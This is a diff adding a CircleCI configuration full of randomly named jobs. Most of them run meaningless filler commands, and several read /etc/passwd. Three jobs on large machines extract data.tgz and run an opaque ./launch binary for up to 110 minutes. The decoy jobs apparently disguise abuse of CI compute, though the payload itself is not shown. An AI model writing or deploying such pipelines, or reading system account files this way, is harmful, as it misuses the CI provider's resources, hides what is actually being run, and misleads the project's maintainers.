+            { set +o pipefail 2>/dev/null; sed -e 's/[^:]*:[^:]*/REDACTED/' /etc/passwd | head -3; true ; } > /tmp/.wsp/step-18.log
+            stat -c '%s %n' /tmp/.wsp/step-18.log
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-18.log
+  hyperion-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/28.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  cleanup_ken-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: downpour
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 10 | awk '{p *= $1}END{print p}'; true ; } > /tmp/.wsp/cache.blob
+            stat -c '%s %n' /tmp/.wsp/cache.blob
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - cache.blob
+  ken-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/cache.blob > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+  fixture_oct21-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: unison
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 60 | awk '{if(NR%6==0)print $0":newline"}'; true ; } > /tmp/.wsp/final.log
+            stat -c '%s %n' /tmp/.wsp/final.log
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - final.log
+  oct21-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-stage data
+          command: |
+            { tail -c 100 /tmp/.wsp/.marker > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar xzvf data.tgz
+      - run:
+          no_output_timeout: 110m
+          command: ./launch && true
+
+  reset_verify-quick-integration-tests_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: banner down
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/.wsp/trace.ndjson; true
+            stat -c '%s %n' /tmp/.wsp/trace.ndjson
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - trace.ndjson
+  linter_polaris-plus_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: staccato
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; which bash || echo bash-missing; true ; } > /tmp/.wsp/stage-ok.out
+            stat -c '%s %n' /tmp/.wsp/stage-ok.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-ok.out
+  reset_sierra-6_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: umbrella up
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "mixer" | sha1sum | md5sum | sha256sum | awk '{print $1}' | head -c 24; true ; } > /tmp/.wsp/buffer.bin
+            stat -c '%s %n' /tmp/.wsp/buffer.bin
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.bin
+  db_add-webhook-timeout_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: oasis
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk -v n=100 'BEGIN{for(i=1;i<=n;i++)print i}' | tail -3; true ; } > /tmp/.wsp/stage-done.out
+            stat -c '%s %n' /tmp/.wsp/stage-done.out
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage-done.out
+  enqueue_rl-alt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: scuttle shut
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=12; result=1; while(n>1){result*=n; n--}; print result}'; true ; } > /tmp/.wsp/step-10.txt
+            stat -c '%s %n' /tmp/.wsp/step-10.txt
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-10.txt
+  Gamma_API-408_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: heavy duty
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'NR<=3' /etc/passwd | md5sum; true ; } > /tmp/.wsp/bundle
+            stat -c '%s %n' /tmp/.wsp/bundle
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - bundle
+  rerun_ken-run_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: rolling hitch
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/_ln && echo src > /tmp/_ln/orig && ln /tmp/_ln/orig /tmp/_ln/hard && stat -c %h /tmp/_ln/orig && rm -rf /tmp/_ln; true ; } > /tmp/.wsp/cache.blob
+            stat -c '%s %n' /tmp/.wsp/cache.blob
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - cache.blob
+  cache_CORE-399_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: hot swap
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; printf "%'d\n" 1234567 2>/dev/null || printf "%d\n" 1234567; true ; } > /tmp/.wsp/2023-10-27.data
+            stat -c '%s %n' /tmp/.wsp/2023-10-27.data
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2023-10-27.data
+workflows:
+  run:
+    jobs:
+      - fetch_fire-up
+      - package_ensure-staging-test-matrix
+      - spinner_fx-v2
+      - fire-up:
+          requires:
+            - fetch_fire-up
+            - package_ensure-staging-test-matrix
+            - spinner_fx-v2
+      - ensure-staging-test-matrix:
+          requires:
+            - fetch_fire-up
+            - package_ensure-staging-test-matrix
+            - spinner_fx-v2
+      - fx-v2:
+          requires:
+            - fetch_fire-up
+            - package_ensure-staging-test-matrix
+            - spinner_fx-v2
+      - LaunchSuite:
+          requires:
+            - fetch_fire-up
+            - package_ensure-staging-test-matrix
+            - spinner_fx-v2
+      - oct21-rev:
+          requires:
+            - fetch_fire-up
+            - package_ensure-staging-test-matrix
+            - spinner_fx-v2
+      - v8-nightly:
+          requires:
+            - fetch_fire-up
+            - package_ensure-staging-test-matrix
+            - spinner_fx-v2
+      - spin-up:
+          requires:
+            - fetch_fire-up
+            - package_ensure-staging-test-matrix
+            - spinner_fx-v2
+      - check-nightly-integration-tests:
+          requires:
+            - fetch_fire-up
+            - package_ensure-staging-test-matrix
+            - spinner_fx-v2
+      - bake-it:
+          requires:
+            - fetch_fire-up
+            - package_ensure-staging-test-matrix
+            - spinner_fx-v2
+      - hook_verify-quick-integration-tests
+      - reset_verify-quick-integration-tests_2:
+          requires:
+            - hook_verify-quick-integration-tests
+      - verify-quick-integration-tests:
+          requires:
+            - reset_verify-quick-integration-tests_2
+      - cache_polaris-plus:
+          requires:
+            - reset_verify-quick-integration-tests_2
+      - linter_polaris-plus_2:
+          requires:
+            - cache_polaris-plus
+      - polaris-plus:
+          requires:
+            - linter_polaris-plus_2
+      - bake_sierra-6:
+          requires:
+            - linter_polaris-plus_2
+      - reset_sierra-6_2:
+          requires:
+            - bake_sierra-6
+      - sierra-6:
+          requires:
+            - reset_sierra-6_2
+      - postcheck_add-webhook-timeout:
+          requires:
+            - reset_sierra-6_2
+      - db_add-webhook-timeout_2:
+          requires:
+            - postcheck_add-webhook-timeout
+      - add-webhook-timeout:
+          requires:
+            - db_add-webhook-timeout_2
+      - preflight_rl-alt:
+          requires:
+            - db_add-webhook-timeout_2
+      - enqueue_rl-alt_2:
+          requires:
+            - preflight_rl-alt
+      - rl-alt:
+          requires:
+            - enqueue_rl-alt_2
+      - stepB_API-408:
+          requires:
+            - enqueue_rl-alt_2
+      - Gamma_API-408_2:
+          requires:
+            - stepB_API-408
+      - API-408:
+          requires:
+            - Gamma_API-408_2
+      - cleanup_ken-run:
+          requires:
+            - Gamma_API-408_2
+      - rerun_ken-run_2:
+          requires:
+            - cleanup_ken-run
+      - ken-run:
+          requires:
+            - rerun_ken-run_2
+      - vendor_CORE-399:
+          requires:
+            - rerun_ken-run_2
+      - cache_CORE-399_2:
+          requires:
+            - vendor_CORE-399
+      - CORE-399:
+          requires:
+            - cache_CORE-399_2
+      - phase_canary-v8
+      - wire_hyperion-v2
+      - canary-v8:
+          requires:
+            - phase_canary-v8
+            - wire_hyperion-v2
+      - hyperion-v2:
+          requires:
+            - phase_canary-v8
+            - wire_hyperion-v2
+      - callisto:
+          requires:
+            - phase_canary-v8
+            - wire_hyperion-v2
+      - validte-2:
+          requires:
+            - phase_canary-v8
+            - wire_hyperion-v2
+      - rc-v4:
+          requires:
+            - phase_canary-v8
+            - wire_hyperion-v2
+      - WEB-890:
+          requires:
+            - phase_canary-v8
+            - wire_hyperion-v2
+      - atlas-ng:
+          requires:
+            - phase_canary-v8
+            - wire_hyperion-v2
+      - bootstrap_tweak-retry
+      - stepA_alpha-v4
+      - orchestrate_v2-beta2
+      - tweak-retry:
+          requires:
+            - bootstrap_tweak-retry
+            - stepA_alpha-v4
+            - orchestrate_v2-beta2
+      - alpha-v4:
+          requires:
+            - bootstrap_tweak-retry
+            - stepA_alpha-v4
+            - orchestrate_v2-beta2
+      - v2-beta2:
+          requires:
+            - bootstrap_tweak-retry
+            - stepA_alpha-v4
+            - orchestrate_v2-beta2
+      - shippit:
+          requires:
+            - bootstrap_tweak-retry
+            - stepA_alpha-v4
+            - orchestrate_v2-beta2
+      - lets-go:
+          requires:
+            - bootstrap_tweak-retry
+            - stepA_alpha-v4
+            - orchestrate_v2-beta2
+      - tango:
+          requires:
+            - bootstrap_tweak-retry
+            - stepA_alpha-v4
+            - orchestrate_v2-beta2
